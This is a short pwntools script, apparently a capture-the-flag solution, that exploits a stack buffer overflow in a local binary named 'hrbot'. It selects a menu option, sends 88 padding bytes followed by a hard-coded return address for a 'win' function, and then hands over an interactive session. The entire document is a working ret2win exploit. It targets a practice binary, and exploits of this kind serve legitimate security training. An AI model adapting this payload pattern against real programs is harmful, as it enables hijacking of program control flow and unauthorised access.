from pwn import *

elf = ELF('./hrbot') 
context.arch = 'amd64' 

def craft_payload():  
    OFFSET = 88               
    WIN_FUNC_ADDRESS = 0x0000000000401256   
    payload = b'A' * OFFSET + p64(WIN_FUNC_ADDRESS)
    return payload

p = process("./hrbot")
p.sendlineafter(b'>', b'1')

payload = craft_payload()
p.sendlineafter(b'characters.', payload)
p.interactive()
